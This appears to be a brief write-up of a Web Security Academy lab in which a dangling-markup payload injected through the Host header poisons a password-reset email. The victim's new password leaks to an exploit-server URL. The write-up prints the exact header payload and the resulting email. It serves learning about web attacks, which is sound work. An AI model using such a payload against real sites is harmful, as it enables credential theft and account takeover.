using the following host header:

Host: 0afa000e04d78cc880a653b40030009b.web-security-academy.net:'<a href="https://exploit-0a8a00ed04ec8c2080ba52de015400c9.exploit-server.net/exploit


I was able to perform a dangling markup language attack on the password reset.


the user goes to their emails and without knowing sends their new password to the exploit server.


the view raw data of the email looks like this:
Sent:     2024-05-18 12:45:36 +0000
From:     no-reply@0afa000e04d78cc880a653b40030009b.web-security-academy.net
To:       carlos@carlos-montoya.net
Subject:  Account recovery

<p>Hello!</p><p>Please <a href='https://0afa000e04d78cc880a653b40030009b.web-security-academy.net:'<a href="https://exploit-0a8a00ed04ec8c2080ba52de015400c9.exploit-server.net/exploit/login'>click here</a> to login with your new password: 7nlBg26i4x</p><p>Thanks,<br/>Support team</p><i>This email has been scanned by the MacCarthy Email Security service</i>

as you can see our html has been injected into the servers and allows us to redirect the user. As this is dangling html markup injection
attack everything up until the next quotation mark gets sent to the server, in this case everything gets sent to our exploit server.